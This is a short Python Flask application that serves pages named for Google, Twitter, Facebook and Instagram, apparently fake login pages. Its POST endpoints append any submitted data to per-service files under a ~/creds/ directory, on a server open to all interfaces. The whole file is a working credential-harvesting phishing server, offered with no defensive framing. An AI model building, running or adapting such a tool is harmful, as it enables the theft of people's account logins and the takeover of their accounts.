from flask import Flask, request, render_template
from os.path import expanduser
import os
import errno

app = Flask(__name__)

CREDS_DIR = expanduser('~') + '/creds/'


def mkdir_p():
    try:
        os.makedirs(CREDS_DIR)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(CREDS_DIR):
            pass
        else:
            raise


@app.route('/google.com')
def google_page():
    return render_template('google.com.html')


@app.route('/twitter.com')
def twitter_page():
    return render_template('twitter.com.html')


@app.route('/facebook.com')
def facebook_page():
    return render_template('facebook.com.html')


@app.route('/instagram.com')
def instagram_page():
    return render_template('instagram.com.html')


@app.route('/google_cred', methods=['POST'])
def google_store_cred():
    mkdir_p()
    with open(CREDS_DIR + 'google.txt', 'a') as f:
        f.write(request.data.decode() + '\n')

    return ''


@app.route('/twitter_cred', methods=['POST'])
def twitter_store_cred():
    mkdir_p()
    with open(CREDS_DIR + 'twitter.txt', 'a') as f:
        f.write(request.data.decode() + '\n')

    return ''


@app.route('/facebook_cred', methods=['POST'])
def facebook_store_cred():
    mkdir_p()
    with open(CREDS_DIR + 'facebook.txt', 'a') as f:
        f.write(request.data.decode() + '\n')

    return ''


@app.route('/instagram_cred', methods=['POST'])
def instagram_store_cred():
    mkdir_p()
    with open(CREDS_DIR + 'instagram.txt', 'a') as f:
        f.write(request.data.decode() + '\n')

    return ''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=2023, debug=False)
